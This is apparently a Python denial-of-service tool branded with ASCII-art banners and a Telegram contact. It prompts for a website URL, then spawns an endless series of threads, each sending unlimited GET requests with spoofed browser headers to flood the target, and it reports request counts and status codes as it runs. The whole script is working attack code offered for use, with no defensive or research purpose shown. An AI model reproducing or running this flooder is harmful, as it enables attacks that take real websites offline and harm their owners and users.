import colorama
import threading 
import aiohttp
import asyncio
import subprocess
import multiprocess
import sys
import time
from time import sleep
import os


fuck = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"
pur = "\033[38;5;129m"

#//Gui Start//#
headers = {
        ":scheme": "https",
        ":method": "POST",
        "pragma": "no-cache",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/.0.0.0 Safari/537.36"
    }

osystem = sys.platform

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
print(f'''{pur}
███████╗██╗   ██╗ ██████╗██╗  ██╗██████╗ ██╗████████╗ ██████╗██╗  ██╗
██╔════╝██║   ██║██╔════╝██║ ██╔╝██╔══██╗██║╚══██╔══╝██╔════╝██║  ██║
█████╗  ██║   ██║██║     █████╔╝ ██████╔╝██║   ██║   ██║     ███████║
██╔══╝  ██║   ██║██║     ██╔═██╗ ██╔══██╗██║   ██║   ██║     ██╔══██║
██║     ╚██████╔╝╚██████╗██║  ██╗██████╔╝██║   ██║   ╚██████╗██║  ██║
╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
                                                METHODS SIMPLE VERSION -_-
''')
print(f'''{red}
                    Credits by VinNotSepuh
''') 
print(f'''{red}
        ┏┳┏┓┳┓┏┓┏┓┳┓  ┳┓┳  ┏┓┏┓┓ ┏┓┓┏  ┏┓┳┳┳┓┏┓┓┏┓┏┓┳┓
         ┃┣┫┃┃┃┓┣┫┃┃  ┃┃┃  ┗┓┣┫┃ ┣┫┣┫  ┃┓┃┃┃┃┣┫┃┫ ┣┫┃┃
        ┗┛┛┗┛┗┗┛┛┗┛┗  ┻┛┻  ┗┛┛┗┗┛┛┗┛┗  ┗┛┗┛┛┗┛┗┛┗┛┛┗┛┗
                                              
''')


time.sleep(2.5)
if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
  
time.sleep(1)
print(f'''{fuck}    
  █████▒█    ██  ▄████▄   ██ ▄█▀ ▄▄▄▄    ██▓▄▄▄█████▓ ▄████▄   ██░ ██ 
▓██   ▒ ██  ▓██▒▒██▀ ▀█   ██▄█▒ ▓█████▄ ▓██▒▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒
▒████ ░▓██  ▒██░▒▓█    ▄ ▓███▄░ ▒██▒ ▄██▒██▒▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░
░▓█▒  ░▓▓█  ░██░▒▓▓▄ ▄██▒▓██ █▄ ▒██░█▀  ░██░░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ 
░▒█░   ▒▒█████▓ ▒ ▓███▀ ░▒██▒ █▄░▓█  ▀█▓░██░  ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓
 ▒ ░   ░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░▒ ▒▒ ▓▒░▒▓███▀▒░▓    ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒
 ░     ░░▒░ ░ ░   ░  ▒   ░ ░▒ ▒░▒░▒   ░  ▒ ░    ░      ░  ▒    ▒ ░▒░ ░
 ░ ░    ░░░ ░ ░ ░        ░ ░░ ░  ░    ░  ▒ ░  ░      ░         ░  ░░ ░
          ░     ░ ░      ░  ░    ░       ░           ░ ░       ░  ░  ░
                ░                     ░              ░                                                                                                            
    {clear}
╔═════════════════════════════════════════════════════╗
║ {fuck}*{clear} Telegram  {fuck}:{clear}   https://t.me/VinNotSepuh            ║
║ {fuck}*{clear} version   {fuck}:{clear}   2.1                                 ║
║ {fuck}*{clear} Created   {fuck}:{clear}   VinNotSepuh                         ║
╚═════════════════════════════════════════════════════╝
''')
#//Gui End//#
num = 0
reqs = []
loop = asyncio.new_event_loop()
r = 0
url = input("{ SYSTEM } Enter Web Url-> ")
print()
time.sleep(1)
if url.startswith("http") or url.startswith("https"):
  pass
else:
  url = "http://"+url

  print(url)
async def fetch(session, url):
    global r, reqs
    start = int(time.time())
    while True:
      async with session.get(url, headers=headers) as response:
        if response:
          set_end = int(time.time())
          set_final = start - set_end
          final = str(set_final).replace("-", "")
 
          if response.status == 200:
            r += 1
          reqs.append(response.status)
          sys.stdout.write(f"Requests : {str(len(reqs))} | Time : {final} | Response Status Code => {str(response.status)}\r")
        else:
          print("[-] Server is not responding")



urls = []
urls.append(url)

async def main():
  tasks = []
  async with aiohttp.ClientSession() as session:
    for url in urls:
      tasks.append(fetch(session, url))
    ddos = await asyncio.gather(*tasks)

def run():
    loop.run_forever(asyncio.run(main()))


if __name__ == '__main__':
  active = []
  ths = []
  while True:
    try:
      while True:
        th = threading.Thread(target=run)
        try:
          th.start()
          ths.append(th)
          sys.stdout.flush()
        except RuntimeError:
          pass
    except:
      pass